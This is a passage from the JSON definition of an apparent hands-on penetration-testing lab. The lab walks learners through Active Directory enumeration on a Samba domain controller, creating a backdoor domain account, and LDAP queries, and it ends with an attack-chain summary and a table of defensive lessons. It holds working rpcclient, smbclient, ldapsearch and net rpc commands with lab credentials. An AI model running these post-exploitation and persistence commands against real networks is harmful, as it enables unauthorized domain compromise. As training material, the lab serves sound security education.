            "content": "## Mapping the Domain\n\nWith Domain Admin credentials, let's discover everything about this network.\n\n### List All Domain Users\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers'\n```\n\n**Expected output:** A list of all domain users with their RIDs (Resource IDs). You should see Administrator, jsmith, mwilliams, svc_backup, and others.\n\n### Get User Details\n\n```bash\n# Query a specific user by username\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'queryuser svc_backup'\n```\n\nNotice the **Description** field shows \"Backup service account\" - this reveals the account's purpose! Service accounts are often high-value targets.\n\n### Enumerate Domain Groups\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomgroups'\n```\n\n### Who's in Domain Admins?\n\n```bash\n# RID 512 = Domain Admins group\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'querygroupmem 512'\n```\n\n> **These enumeration skills transfer directly to Windows AD.** Master them here, use them everywhere.\n"
          },
          {
            "id": "step4_3",
            "vm": "kali",
            "title": "Check Password Policy",
            "content": "## Password Policy Enumeration\n\nUnderstanding the domain's password policy helps plan attacks like password spraying.\n\n### Get Domain Password Policy\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getdompwinfo'\n```\n\n**What to look for:**\n- **Minimum password length** - Short = weak passwords likely\n- **Password complexity** - Disabled = simple passwords\n- **Lockout threshold** - How many guesses before lockout?\n\n### Get Account Lockout Policy\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getusrdompwinfo 500'\n```\n\n> **Why this matters:** If there's no lockout (or high threshold), you could spray passwords against all users. In this lab, you already have Domain Admin, but in real engagements this is valuable recon.\n"
          },
          {
            "id": "step4_4",
            "vm": "kali",
            "title": "Prove Domain Control",
            "content": "## Demonstrate Full Domain Access\n\nThe ultimate proof of domain compromise is accessing protected resources.\n\n### Access SYSVOL (Domain Admin Required)\n\nSYSVOL contains Group Policy objects. Only Domain Admins can write here:\n\n```bash\nsmbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'\n```\n\n### Access NETLOGON Share\n\n```bash\nsmbclient //172.16.2.12/netlogon -U 'Administrator%Adm1n2024' -c 'ls'\n```\n\n### What This Proves\n\nSuccessfully accessing SYSVOL and NETLOGON confirms:\n- Your credentials are valid Domain Admin\n- You can read/write domain-wide configuration\n- You have the highest level of access in the domain\n\n> **Note:** The file server in this lab uses local authentication, not domain authentication. In a real Windows environment, Domain Admin would grant access to all domain-joined systems.\n"
          },
          {
            "id": "step4_5",
            "vm": "kali",
            "title": "Create a Backdoor Account",
            "content": "## Persistence: Adding a Backdoor\n\nA common post-exploitation technique is creating a hidden admin account for persistent access.\n\n### Create a New Domain User with Password\n\nThe `net rpc` command creates users with a password in one step:\n\n```bash\nnet rpc user add support 'P@ssw0rd123!' -U 'Administrator%Adm1n2024' -S 172.16.2.12\n```\n\n**Expected output:** `Added user 'support'.`\n\n### Verify the Account Exists\n\n```bash\nrpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers' | grep support\n```\n\n### Test the New Account\n\n```bash\nsmbclient -L //172.16.2.12 -U 'support%P@ssw0rd123!'\n```\n\nYou should see the share listing, confirming the account works!\n\n> **Attacker tradecraft:** Accounts named \"support\", \"svc_scanner\", or \"helpdesk\" blend in with legitimate accounts. Blue teams should alert on any new account creation.\n\n### Why This Matters\n\nWith Domain Admin access, attackers can:\n- \u2705 **Create new admin accounts** for persistence\n- \u2705 **Read/write any file** on domain systems\n- \u2705 **Access all user data** across the organization\n- \u2705 **Modify Group Policy** (in Windows AD)\n\n> **You now have complete domain control with a persistent backdoor!**\n"
          }
        ]
      },
      {
        "id": "phase5",
        "name": "Post-Exploitation",
        "steps": [
          {
            "id": "step5_1",
            "vm": "kali",
            "title": "LDAP Deep Dive",
            "content": "## LDAP Enumeration\n\nLDAP provides more detailed information than RPC. Let's extract everything.\n\n> **Note:** Samba AD requires encrypted LDAP connections. We use `-ZZ` for StartTLS and `LDAPTLS_REQCERT=never` to accept self-signed certificates.\n\n### List All Users with Details\n\n```bash\nLDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \\\n  -D \"cn=Administrator,cn=Users,DC=acmewidgets,DC=local\" \\\n  -w 'Adm1n2024' \\\n  -b 'cn=Users,DC=acmewidgets,DC=local' \\\n  '(objectClass=user)' sAMAccountName description memberOf\n```\n\n### Find Service Accounts\n\nService accounts often have elevated privileges and weak passwords:\n\n```bash\nLDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \\\n  -D \"cn=Administrator,cn=Users,DC=acmewidgets,DC=local\" \\\n  -w 'Adm1n2024' \\\n  -b 'DC=acmewidgets,DC=local' \\\n  '(description=*service*)' sAMAccountName description\n```\n\n### Export Domain Admin Members\n\n```bash\nLDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \\\n  -D \"cn=Administrator,cn=Users,DC=acmewidgets,DC=local\" \\\n  -w 'Adm1n2024' \\\n  -b 'DC=acmewidgets,DC=local' \\\n  '(cn=Domain Admins)' member\n```\n\n> **Pro tip:** In real engagements, export this data to a file and analyze offline to find attack paths and high-value targets.\n"
          },
          {
            "id": "step5_2",
            "vm": "kali",
            "title": "Skills That Transfer to Windows AD",
            "content": "## What You Learned Applies Everywhere\n\nThis lab uses **Samba AD** (Linux-based), but the skills you practiced transfer directly to Windows Active Directory:\n\n| Skill | Works on Samba | Works on Windows |\n|-------|----------------|------------------|\n| SMB authentication | \u2705 | \u2705 |\n| RPC user/group enumeration | \u2705 | \u2705 |\n| LDAP queries | \u2705 | \u2705 |\n| Password policy checks | \u2705 | \u2705 |\n| Backdoor account creation | \u2705 | \u2705 |\n\n### Windows-Only Attacks (For Future Learning)\n\nWhen you encounter **Windows AD** in other labs or real engagements, you'll have additional options:\n\n- **DCSync** - Extract all password hashes from the domain\n- **PSExec/WMIExec** - Get remote shells on Windows machines\n- **Kerberoasting** - Crack service account passwords\n- **Pass-the-Hash** - Authenticate with NTLM hashes\n\nThese require Windows-specific protocols that Samba doesn't implement.\n\n> **Key takeaway:** Master the fundamentals here (enumeration, lateral movement, persistence) - they're the foundation for all AD attacks.\n"
          },
          {
            "id": "step5_3",
            "vm": "kali",
            "title": "Mission Complete!",
            "content": "## Attack Chain Summary\n\nCongratulations! Here's your complete attack path:\n\n```\n1. RECONNAISSANCE\n   \u2514\u2500\u2500 nmap discovered WordPress at 172.16.0.100\n       \u2514\u2500\u2500 Ports 22 (SSH), 80 (HTTP) open\n\n2. SQL INJECTION\n   \u2514\u2500\u2500 Employee Directory (/employees/)\n       \u2514\u2500\u2500 SQLi in employee_id parameter\n           \u2514\u2500\u2500 Extracted credentials:\n               - svc_backup / Backup2024\n\n3. LATERAL MOVEMENT\n   \u2514\u2500\u2500 Credential reuse on file server (172.16.2.10)\n       \u2514\u2500\u2500 svc_backup \u2192 sensitive share\n           \u2514\u2500\u2500 Found passwords.txt\n               \u2514\u2500\u2500 Domain Admin: Adm1n2024\n\n4. DOMAIN COMPROMISE\n   \u2514\u2500\u2500 Authenticated to DC01 (172.16.2.12)\n       \u2514\u2500\u2500 Enumerated all users and groups\n           \u2514\u2500\u2500 Checked password policies\n               \u2514\u2500\u2500 Created backdoor \"support\" account\n\n5. PERSISTENCE\n   \u2514\u2500\u2500 Backdoor account: support / P@ssw0rd123!\n       \u2514\u2500\u2500 Full domain access established\n```\n\n## Defensive Lessons\n\n| Vulnerability | Fix |\n|--------------|-----|\n| SQL Injection | Parameterized queries, input validation |\n| Plaintext passwords in files | Use a secrets manager (Vault, AWS Secrets) |\n| Password reuse | Unique passwords + MFA everywhere |\n| Sensitive files on shares | Proper ACLs, audit access |\n| No account creation alerts | Monitor for new accounts (SIEM) |\n| Service accounts with file access | Least privilege, no interactive logon |\n\n## Next Steps for Learning\n\n1. **Try attacking differently** - Can you get Domain Admin without using passwords.txt?\n2. **Blue team it** - How would you detect each attack step?\n3. **Expand your skills** - Try Kerberoasting, AS-REP roasting in Windows labs\n\n> **Remember:** Only use these techniques with explicit written authorization!\n"
          }
        ]
      }
    ]
  },
  "content_hash": "bc630492f9698d4684cc363366d62ea861014e896a8628ff09fb096bfa3f5d0b",
  "assets": []
}